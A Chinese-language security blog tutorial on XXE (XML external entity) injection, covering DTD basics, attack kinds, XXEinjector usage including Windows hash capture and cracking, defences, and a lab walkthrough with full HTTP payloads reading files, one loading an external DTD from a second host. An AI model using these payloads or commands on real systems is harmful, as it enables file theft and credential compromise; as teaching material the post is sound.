<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>Baz&#x27;s blog</title>

      
        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://baz.ee/atom.xml">
      

      
          <link rel="stylesheet" href="https://baz.ee/site.css">
      

      
      
    </head>

    <body class="hack dark main container">
        
    
        
                
                    <header>
                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
                        
                            <a itemprop="url"
                               class=""
                               href="https:&#x2F;&#x2F;baz.ee">
                                <span itemprop="name">Home
                                </span></a>
                        
                            <a itemprop="url"
                               class=""
                               href="https:&#x2F;&#x2F;baz.ee&#x2F;categories">
                                <span itemprop="name">Categories
                                </span></a>
                        
                            <a itemprop="url"
                               class=""
                               href="https:&#x2F;&#x2F;baz.ee&#x2F;tags">
                                <span itemprop="name">Tags
                                </span></a>
                        
                        </nav>
                    </header>
                
            
    

<article itemscope itemtype="http://schema.org/BlogPosting">
    <header>
        <h1 itemprop="headline">XXE-XML注入</h1>
        <span class="muted">
    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
         width="16" height="16" fill="none" stroke="currentcolor"
         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
        <circle cx="16" cy="16" r="14"/>
        <path d="M16 8 L16 16 20 20"/>
    </svg>
    <span>43 minute read</span>
    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
         width="16" height="16" fill="none" stroke="currentcolor"
         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
    </svg>

    Published: 2021-06-17
</span>
    </header>
    <div itemprop="articleBody">
      <h1 id="xml-dtdde-ji-ben-shi-yong-fang-fa">XML+DTD的基本使用方法</h1>
<h2 id="shi-yao-shi-xml">什么是XML</h2>
<ul>
<li>XML指可扩展标记语言（EXtensible Markup Language）</li>
<li>XML是一种很像HTML的标记语言</li>
<li>XML的设计宗旨是传输数据，而不是显示数据</li>
<li>XML标签没有被预定义，需要自行定义标签</li>
<li>XML被设计为具有自我描述性</li>
<li>XML是W3C的推荐标准</li>
<li><span id="continue-reading"></span></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623917284931-12f801e6-99f2-4b30-bdad-580eed973657.png#align=left&amp;display=inline&amp;height=292&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.07.53.png&amp;originHeight=744&amp;originWidth=836&amp;size=398015&amp;status=done&amp;style=none&amp;width=328" alt="截屏2021-06-17 下午4.07.53.png" /><br />需要注意的是：XML不会做任何事情，它仅仅是包装在XML标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p>
<h2 id="xmlyong-tu">XML用途</h2>
<ul>
<li>简化数据共享</li>
<li>简化数据传输</li>
<li>简化平台变更</li>
<li>使数据更加有用</li>
</ul>
<h2 id="shi-yao-shi-dtd">什么是DTD</h2>
<p>定义：DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。<br />作用：</p>
<ol>
<li>一个应用程序也可以使用DTD来确认从DTD收到的数据是有效的</li>
<li>每个XML文件可以携带一个自身格式的描述</li>
<li>不同组织的人可以使用一个通用DTD来交换数据</li>
</ol>
<h2 id="dtdfen-lei">DTD分类</h2>
<p>内部DTD<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918218039-510d635d-1ae1-4ff6-97be-a1b75a8f5137.png#align=left&amp;display=inline&amp;height=246&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.23.21.png&amp;originHeight=552&amp;originWidth=1038&amp;size=448655&amp;status=done&amp;style=none&amp;width=462" alt="截屏2021-06-17 下午4.23.21.png" /><br />外部DTD<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918272629-dc623c1d-7055-48a7-ba3b-ac3d9f93bf03.png#align=left&amp;display=inline&amp;height=197&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.24.20.png&amp;originHeight=552&amp;originWidth=1300&amp;size=525269&amp;status=done&amp;style=none&amp;width=463" alt="截屏2021-06-17 下午4.24.20.png" /><br />公有DTD<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918341001-e4dcf711-500b-4cef-874f-1bf73dbeff47.png#align=left&amp;display=inline&amp;height=40&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.25.30.png&amp;originHeight=124&amp;originWidth=2448&amp;size=322609&amp;status=done&amp;style=none&amp;width=792" alt="截屏2021-06-17 下午4.25.30.png" /></p>
<h2 id="dtdshi-ti">DTD实体</h2>
<p>内部实体<br /><!ENTITY 实体名称 "实体的值"><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918660673-8aac5b03-0174-43bd-9f7a-c938d4d46e5a.png#align=left&amp;display=inline&amp;height=120&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.30.48.png&amp;originHeight=282&amp;originWidth=896&amp;size=196818&amp;status=done&amp;style=none&amp;width=381" alt="截屏2021-06-17 下午4.30.48.png" /><br />外部实体<br /><!ENTITY 实体名称 SYSTEM "URL"><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918777670-f60a9a13-df29-49c4-8b8a-24acd0115652.png#align=left&amp;display=inline&amp;height=136&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.32.44.png&amp;originHeight=310&amp;originWidth=868&amp;size=227080&amp;status=done&amp;style=none&amp;width=380" alt="截屏2021-06-17 下午4.32.44.png" /><br />参数实体<br /><!ENTITY % 实体名称 [SYSTEM] "URL"><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623918874001-9a7c61b3-93cd-4f5f-b4e7-d2ef04d7bab8.png#align=left&amp;display=inline&amp;height=77&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.34.25.png&amp;originHeight=208&amp;originWidth=1032&amp;size=134757&amp;status=done&amp;style=none&amp;width=381" alt="截屏2021-06-17 下午4.34.25.png" /></p>
<ol>
<li>参数实体只能在DTD中定义，DTD中引用</li>
<li>参数实体和通用实体一样，参数实体也可以外部引用</li>
<li>实体的声明中不能引用其他参数实体</li>
<li>非参数实体只能在DTD中定义，在xml文档中引用</li>
</ol>
<h2 id="dtdyuan-su">DTD元素</h2>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919505307-0ebe69ed-fbd4-4b9f-b55e-7be384f2b15b.png#align=left&amp;display=inline&amp;height=960&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.44.55.png&amp;originHeight=960&amp;originWidth=2186&amp;size=400979&amp;status=done&amp;style=none&amp;width=2186" alt="截屏2021-06-17 下午4.44.55.png" /></p>
<h2 id="dtdde-shi-yong">DTD的使用</h2>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919725924-3036e7cc-093c-470d-b0a5-cb79d90ca0dc.png#align=left&amp;display=inline&amp;height=614&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.47.48.png&amp;originHeight=1246&amp;originWidth=1128&amp;size=1072736&amp;status=done&amp;style=none&amp;width=556" alt="截屏2021-06-17 下午4.47.48.png" /><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919749398-2ecc4d9e-726c-4224-9099-a322c3db1eae.png#align=left&amp;display=inline&amp;height=321&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.48.03.png&amp;originHeight=724&amp;originWidth=1264&amp;size=592639&amp;status=done&amp;style=none&amp;width=560" alt="截屏2021-06-17 下午4.48.03.png" /><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623919775613-1fd20acd-9959-4e37-9241-35ed837b3323.png#align=left&amp;display=inline&amp;height=184&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%884.48.33.png&amp;originHeight=416&amp;originWidth=1260&amp;size=340665&amp;status=done&amp;style=none&amp;width=558" alt="截屏2021-06-17 下午4.48.33.png" /></p>
<h1 id="xxelou-dong-yuan-li">XXE漏洞原理</h1>
<p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。如果开发人员在开发时允许引用外部实体时，恶意用户便会利用这一漏洞构造恶意语句，从而引发文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，可见其危害之大。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623929799912-1e4bc587-ea73-4bf7-ad88-4d0e9740030b.png#align=left&amp;display=inline&amp;height=218&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.36.27.png&amp;originHeight=560&amp;originWidth=1064&amp;size=287717&amp;status=done&amp;style=none&amp;width=414" alt="截屏2021-06-17 下午7.36.27.png" /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624115596592-0a5c9513-a254-4e49-8784-91590dd5297a.png#align=left&amp;display=inline&amp;height=253&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=519&amp;originWidth=857&amp;size=142117&amp;status=done&amp;style=none&amp;width=417" alt="image.png" /><br />**XXE注入的主要利用点是 **<strong>外部实体</strong></p>
<h1 id="xxelou-dong-fen-lei-an-gou-zao-wai-bu-shi-ti-sheng-ming">XXE漏洞分类（按构造外部实体声明）</h1>
<ol>
<li>直接通过DTD外部实体声明</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623930146397-482d3699-2356-404b-a16a-afd691668fb4.png#align=left&amp;display=inline&amp;height=100&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.41.30.png&amp;originHeight=368&amp;originWidth=1568&amp;size=274496&amp;status=done&amp;style=none&amp;width=427" alt="截屏2021-06-17 下午7.41.30.png" /><br />Margin.dtd文件内容<br /><!ENTITY f SYSTEM "file:///etc/passwd"></p>
<ol start="2">
<li>通过DTD文档引入外部DTD文档中的外部实体声明</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623930314869-205ecb8e-c744-4300-8316-44bb1bac4ef3.png#align=left&amp;display=inline&amp;height=49&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.41.48.png&amp;originHeight=186&amp;originWidth=2256&amp;size=289702&amp;status=done&amp;style=none&amp;width=593" alt="截屏2021-06-17 下午7.41.48.png" /></p>
<ol start="3">
<li>通过DTD外部实体声明引入外部文档中的外部实体声明</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623930404422-ab134fca-613d-4cc7-afe3-03a272283dbb.png#align=left&amp;display=inline&amp;height=79&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%887.42.05.png&amp;originHeight=324&amp;originWidth=2068&amp;size=348584&amp;status=done&amp;style=none&amp;width=502" alt="截屏2021-06-17 下午7.42.05.png" /></p>
<h1 id="xxelou-dong-fen-lei">XXE漏洞分类</h1>
<ol>
<li>正常回显XXE</li>
</ol>
<p>正常回显XXE是最传统的XXE攻击，在利用过程中服务器会直接回显信息，可直接完成XXE攻击。</p>
<ol start="2">
<li>报错XXE</li>
</ol>
<p>报错XXE是回显XXE攻击的一种特例，它与正常回显XXE的不同在于它在利用过程中服务器回显的是错误信息，可根据错误信息的不同判断是否注入成功。</p>
<ol start="3">
<li>Blind XXE</li>
</ol>
<p>当服务器没有回显，我们可以选择使用Blind XXE。与前两种XXE不同之处在于Blind XXE无回显信息，可组合利用file协议来读取文件或http协议和ftp协议来查看日志</p>
<h1 id="xxede-wei-hai">XXE的危害</h1>
<h2 id="du-qu-ren-yi-wen-jian">读取任意文件</h2>
<p>PHP中可以通过file协议、http协议和ftp协议读取文件，还可以利用PHP伪协议。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932049221-ca0e87d9-73af-4838-a183-d1b13166e17e.png#align=left&amp;display=inline&amp;height=103&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.13.49.png&amp;originHeight=356&amp;originWidth=1566&amp;size=298968&amp;status=done&amp;style=none&amp;width=454" alt="截屏2021-06-17 下午8.13.49.png" /><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932094518-1443e3c4-c78f-40c8-9566-6f91f75d0fff.png#align=left&amp;display=inline&amp;height=155&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.14.40.png&amp;originHeight=582&amp;originWidth=1694&amp;size=1594704&amp;status=done&amp;style=none&amp;width=452" alt="截屏2021-06-17 下午8.14.40.png" /></p>
<h2 id="zhi-xing-xi-tong-ming-ling">执行系统命令</h2>
<p>这种情况很少发生，但在配置不当/开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932484573-1c34c559-5b41-4cde-b504-547c3ee52655.png#align=left&amp;display=inline&amp;height=124&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.21.11.png&amp;originHeight=362&amp;originWidth=1316&amp;size=290238&amp;status=done&amp;style=none&amp;width=452" alt="截屏2021-06-17 下午8.21.11.png" /></p>
<h2 id="nei-wang-duan-kou-tan-ce">内网端口探测</h2>
<p>可根据返回信息内容判断该端口是否打开。若测试端口返回“Connection refused”，则可以知道该端口是closed的，否则为open。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623932694797-eca2f894-7abc-4d8e-8875-d17ad08dbf3b.png#align=left&amp;display=inline&amp;height=134&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.24.33.png&amp;originHeight=570&amp;originWidth=1926&amp;size=520421&amp;status=done&amp;style=none&amp;width=454" alt="截屏2021-06-17 下午8.24.33.png" /></p>
<h2 id="jarxie-yi-shang-chuan-wen-jian">jar协议上传文件</h2>
<p>jar协议语法    jar:{url}!/{entry}<br />url是文件的路径，entry是想要解压出来的文件<br />jar协议处理文件的过程：下载jar/zip文件到临时文件中提取出我们指定的文件删除临时文件<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623933204568-64d2740d-9839-4d08-8965-a5006dc6ef75.png#align=left&amp;display=inline&amp;height=77&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.33.09.png&amp;originHeight=338&amp;originWidth=2276&amp;size=413186&amp;status=done&amp;style=none&amp;width=518" alt="截屏2021-06-17 下午8.33.09.png" /></p>
<h1 id="xxeli-yong-gong-ju-xxeinjector">XXE利用工具-XXEinjector</h1>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623933410378-67e801c6-ec16-4d57-8bcc-3f34ce3e980a.png#align=left&amp;display=inline&amp;height=1270&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.36.34.png&amp;originHeight=1270&amp;originWidth=2566&amp;size=1133272&amp;status=done&amp;style=none&amp;width=2566" alt="截屏2021-06-17 下午8.36.34.png" /></p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>--host           必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
</span><span>--file           必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)
</span><span>--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)
</span><span>--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)
</span><span>--logger         记录输出结果。
</span><span>--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
</span><span>--rport          远程主机的TCP端口信息。(--rport=8080)
</span><span>--phpfilter      在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
</span><span>--netdoc         使用netdoc协议。(Java).
</span><span>--enumports      枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
</span><span>--hashes         窃取运行当前应用程序用户的Windows哈希。
</span><span>--expect         使用PHP expect扩展执行任意系统命令。(--expect=ls)
</span><span>--upload         使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)
</span><span>--xslt           XSLT注入测试。
</span><span>--ssl            使用SSL。
</span><span>--proxy          使用代理。(--proxy=127.0.0.1:8080)
</span><span>--httpport       自定义HTTP端口。(--httpport=80)
</span><span>--ftpport        设置自定义FTP端口。(--ftpport=21)
</span><span>--gopherport     设置自定义gopher端口。(--gopherport=70)
</span><span>--jarport        设置自定义文件上传端口。(--jarport=1337)
</span><span>--xsltport       设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
</span><span>--test           该模式可用于测试请求的有效。
</span><span>--urlencode      URL编码，默认为URI。
</span><span>--output         爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)
</span><span>--timeout        设置接收文件/目录内容的Timeout。(--timeout=20)
</span><span>--contimeout     设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
</span><span>--fast           跳过枚举询问，有可能出现结果假阳性。
</span><span>--verbose        显示verbose信息。
</span><span>一、读取文件：
</span><span>ruby XXEinjector.rb --host=192.168.0.110 --path=c:/flag.txt --httpport=80 --file=req.txt --verbose --oob=http --phpfilter
</span><span>二、获取Windows 用户Hash
</span><span>1、启动msf，执行use auxiliary/server/capture/smb ,set johnpwfile /tmp/john, run
</span><span>2、执行： ruby XXEinjector.rb --host=192.168.0.110  --file=req.txt --hashes --verbose
</span><span>3、查看/tmp/john中的Hash
</span><span>4、执行命令破解：john --format=netntlmv2 /tmp/john，或john /tmp/john_netntlm --format=netntlm
</span><span>三、目录浏览：
</span><span>ruby XXEinjector.rb --host=10.2.7.180 --path=c:/ --file=req3.txt --verbose
</span></code></pre>
<h1 id="xxefang-yu">XXE防御</h1>
<p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC<br />PHP下<br />libxml_disable_entity_loader(true);<br />python下<br />from lxml import etree<br />xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<br />Java下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623934129947-82a4b1eb-eae4-44c4-b71b-710f937da0b7.png#align=left&amp;display=inline&amp;height=1142&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-17%20%E4%B8%8B%E5%8D%888.48.34.png&amp;originHeight=1142&amp;originWidth=2032&amp;size=741526&amp;status=done&amp;style=none&amp;width=2032" alt="截屏2021-06-17 下午8.48.34.png" /></p>
<h1 id="xxelou-dong-shi-zhan">XXE漏洞实战</h1>
<h2 id="phpyu-yan-xia-de-xxelou-dong-shi-zhan">PHP语言下的XXE漏洞实战</h2>
<p>环境：<a href="http://gv7.me/">c0ny1</a>的xxe-lab<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623953489264-c04a8a17-b83b-42ac-ba80-a32475cfb9a1.png#align=left&amp;display=inline&amp;height=1666&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.11.16.png&amp;originHeight=1666&amp;originWidth=2536&amp;size=385603&amp;status=done&amp;style=none&amp;width=2536" alt="截屏2021-06-18 上午2.11.16.png" /><br />目标<br />寻找C盘下的flag</p>
<p>首先利用burp抓包<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623953683517-891b61c7-f7ff-4eb6-8792-ba7da301bc1c.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.14.20.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=483256&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-18 上午2.14.20.png" /><br />在repeater中改包发包<br />发送包修改为如下</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>POST /php_xxe/doLogin.php HTTP/1.1
</span><span>Host: 192.168.43.231
</span><span>Content-Length: 158
</span><span>Accept: application/xml, text/xml, */*; q=0.01
</span><span>X-Requested-With: XMLHttpRequest
</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span><span>Content-Type: application/xml;charset=UTF-8
</span><span>Origin: http://192.168.43.231
</span><span>Referer: http://192.168.43.231/php_xxe/
</span><span>Accept-Encoding: gzip, deflate
</span><span>Accept-Language: zh-CN,zh;q=0.9
</span><span>Connection: close
</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&#39;</span><span style="color:#a3be8c;">1.0</span><span>&#39;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="background-color:#bf616a;color:#2b303b;">user[</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY baz SYSTEM &quot;file:///c:/flag.txt&quot;&gt;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;admin</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">baz;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span></code></pre>
<p>成功得到flag内容<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623956215547-e0b7c5d0-2a6b-4723-9943-8b09eb5111e9.png#align=left&amp;display=inline&amp;height=1750&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%882.56.41.png&amp;originHeight=1750&amp;originWidth=2696&amp;size=661785&amp;status=done&amp;style=none&amp;width=2696" alt="截屏2021-06-18 上午2.56.41.png" /><br />后台源码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623957654248-590a87a0-3da1-4d7a-995a-2239d6ba891b.png#align=left&amp;display=inline&amp;height=1196&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%883.19.43.png&amp;originHeight=1196&amp;originWidth=1532&amp;size=345572&amp;status=done&amp;style=none&amp;width=1532" alt="截屏2021-06-18 上午3.19.43.png" /></p>
<h2 id="xxelou-dong-du-qu-you-te-shu-zi-fu-de-wen-jian">XXE漏洞读取有特殊字符的文件</h2>
<p>上面所述的flag文件中的字符都是普通字符，如果flag文件中的内容为一段PHP代码，则无法输出。例如，文件的内容为flag{<?php phpinfo();?>}，则只会输出flag{}。<br />所以需要用到CDATA<br />被<code>&lt;![CDATA[]]&gt;</code>这个标记所包含的内容将表示为<strong>纯文本</strong>，比如<code>&lt;![CDATA[&lt;]]&gt;</code>表示文本内容<code>&lt;</code>。<br />此标记用于xml文档中，我们先来看看使用转义符的情况。我们知道，在xml中，<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>等字符是不能直接存入的，否则xml语法检查时会<strong>报错</strong>，如果想在xml中使用这些符号，必须将其转义为实体，如<code>&amp;lt;</code>、<code>&amp;gt;</code>、<code>&amp;amp;</code>，这样才能保存进xml文档。<br />在使用程序读取的时候，解析器会自动将这些实体转换回<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>。</p>
<p>那么如何读取存在特殊字符的文件呢？<br />首先，写下如下代码</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&quot;</span><span style="color:#a3be8c;">1.0</span><span>&quot; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;
</span><span>&lt;</span><span style="color:#bf616a;">ENTITY </span><span style="color:#d08770;">all </span><span style="background-color:#bf616a;color:#2b303b;">&quot;%start;%baz;%stop;&quot;</span><span>
</span></code></pre>
<p>再将这段代码命名为blaze.dtd，并上传到另一台服务器，这里以 Kali Linux 为例<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623973757345-d4a35c15-908f-4d99-8cb9-6ea6d7232c14.png#align=left&amp;display=inline&amp;height=97&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.49.01.png&amp;originHeight=180&amp;originWidth=824&amp;size=82233&amp;status=done&amp;style=none&amp;width=443" alt="截屏2021-06-18 上午7.49.01.png" /><br />输入<br />python -m http.server    启动监听<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623973899142-c3cad7e7-a0b9-4045-a34e-699787478abd.png#align=left&amp;display=inline&amp;height=54&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-18%20%E4%B8%8A%E5%8D%887.51.27.png&amp;originHeight=118&amp;originWidth=970&amp;size=64864&amp;status=done&amp;style=none&amp;width=443" alt="截屏2021-06-18 上午7.51.27.png" /><br />将发送报文修改为如下</p>
<pre data-lang="xml" style="background-color:#2b303b;color:#c0c5ce;" class="language-xml "><code class="language-xml" data-lang="xml"><span>POST /php_xxe/doLogin.php HTTP/1.1
</span><span>Host: 192.168.43.231
</span><span>Content-Length: 297
</span><span>Accept: application/xml, text/xml, */*; q=0.01
</span><span>X-Requested-With: XMLHttpRequest
</span><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span><span>Content-Type: application/xml;charset=UTF-8
</span><span>Origin: http://192.168.43.231
</span><span>Referer: http://192.168.43.231/php_xxe/
</span><span>Accept-Encoding: gzip, deflate
</span><span>Accept-Language: zh-CN,zh;q=0.9
</span><span>Connection: close
</span><span>
</span><span>&lt;?</span><span style="color:#bf616a;">xml </span><span style="color:#d08770;">version</span><span>=&#39;</span><span style="color:#a3be8c;">1.0</span><span>&#39; </span><span style="color:#d08770;">encoding</span><span>=&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;?&gt;
</span><span>&lt;!</span><span style="color:#b48ead;">DOCTYPE </span><span style="background-color:#bf616a;color:#2b303b;">user[</span><span>
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % baz SYSTEM &quot;file:///c:/flag.txt&quot;&gt;
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % start &quot;&lt;![</span><span style="color:#b48ead;">CDATA</span><span>[</span><span style="color:#a3be8c;">&quot;&gt;
</span><span style="color:#a3be8c;">&lt;!ENTITY % stop &quot;</span><span>]]&gt;&quot;&gt;
</span><span style="background-color:#bf616a;color:#2b303b;">&lt;</span><span>!ENTITY % dtd SYSTEM &quot;http://192.168.43.147:8000/blaze.dtd&quot;&gt;
</span><span>%dtd;
</span><span>]&gt;
</span><span>&lt;</span><span style="color:#bf616a;">user</span><span>&gt;&lt;</span><span style="color:#bf616a;">username</span><span>&gt;</span><span style="color:#8fa1b3;">&amp;</span><span style="color:#d08770;">all;</span><span>&lt;/</span><span style="color:#bf616a;">username</span><span>&gt;&lt;</span><span style="color:#bf616a;">password</span><span>&gt;admin&lt;/</span><span style="color:#bf616a;">password</span><span>&gt;&lt;/</span><span style="color:#bf616a;">user</span><span>&gt;
</span></code></pre>
